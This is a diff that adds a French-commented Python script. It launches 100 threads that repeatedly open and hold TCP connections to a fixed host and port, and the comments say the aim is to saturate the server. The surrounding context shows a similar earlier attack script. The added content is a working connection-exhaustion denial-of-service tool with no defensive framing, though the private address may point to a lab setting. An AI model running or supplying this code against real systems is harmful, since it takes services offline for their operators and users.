@@ -37,3 +37,43 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print("\n[*] Arrêt de l'attaque.")
 #--------------------------------------------------------------------------------
+# autre code avec le methode de multithread : 
+
+import socket
+import threading
+import time
+
+TARGET_IP = "10.0.0.2"
+TARGET_PORT = 31337
+
+def worker():
+    while True:
+        try:
+            # Création d'une socket TCP classique
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((TARGET_IP, TARGET_PORT))
+            
+            # Maintenir la connexion ouverte pour saturer le serveur
+            time.sleep(1.5)
+            s.close()
+        except Exception:
+            # Petite pause en cas d'erreur ou de rejet avant de relancer
+            time.sleep(0.01)
+
+def main():
+    print(f"[*] Attaque multi-thread lancée sur {TARGET_IP}:{TARGET_PORT}...")
+    
+    # Lancement de 100 threads indépendants
+    for _ in range(100):
+        t = threading.Thread(target=worker)
+        t.daemon = True
+        t.start()
+
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n[*] Arrêt du script.")
+
+if __name__ == "__main__":
+    main()
